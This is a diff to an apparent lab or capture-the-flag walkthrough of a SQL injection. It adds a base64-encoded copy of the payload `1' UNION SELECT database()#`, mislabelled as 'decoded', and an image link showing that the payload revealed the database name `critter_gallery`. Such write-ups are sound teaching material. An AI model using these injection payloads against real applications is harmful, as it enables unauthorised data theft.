@@ -141,6 +141,12 @@ Plain-text payload:
 1' UNION SELECT database()#
 ```
 
+Base64 Decoded payload:
+
+```
+MScgVU5JT04gU0VMRUNUIGRhdGFiYXNlKCkjICAg
+```
+
 Response:
 
 ```
@@ -149,7 +155,8 @@ critter_gallery
 
 So the database was called `critter_gallery`.
 
-**📸 [Insert screenshot here: encoded payload for `database()` and response showing `critter_gallery`]**
+**Encoded payload for `database()` and response showing `critter_gallery`**
+![Encoded payload for `database()`](image_file/8.jpg)
 
 ---
 
